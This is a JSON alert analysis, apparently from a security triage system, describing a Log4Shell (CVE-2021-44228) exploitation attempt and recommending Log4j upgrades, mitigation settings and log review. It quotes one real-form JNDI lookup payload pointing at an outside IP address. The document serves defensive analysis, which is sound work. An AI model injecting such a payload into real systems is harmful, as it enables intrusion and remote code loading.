{
  "explanation": "The attacker attempted to exploit the Log4Shell vulnerability (CVE-2021-44228) by injecting a malicious JNDI lookup string (${jndi:dns://45.83.64.1/x}) into the HTTP request headers or parameters, which is logged by vulnerable applications. The status code 200 indicates the server processed the request, but without further telemetry, it is unclear whether the application was vulnerable or if the lookup successfully executed.",
  "mitre_tactic": "Initial Access",
  "recommended_actions": [
    "Upgrade Apache Log4j to version 2.15.0 or higher (ideally 2.17.1 or later) to completely remediate the vulnerability.",
    "If upgrading is not immediately possible, set the system property 'log4j2.formatMsgNoLookups' to 'true' or remove the 'JndiLookup' class from the classpath.",
    "Inspect application logs and network traffic for outbound DNS or LDAP requests originating from the server to identify potential successful exploitation attempts."
  ]
}
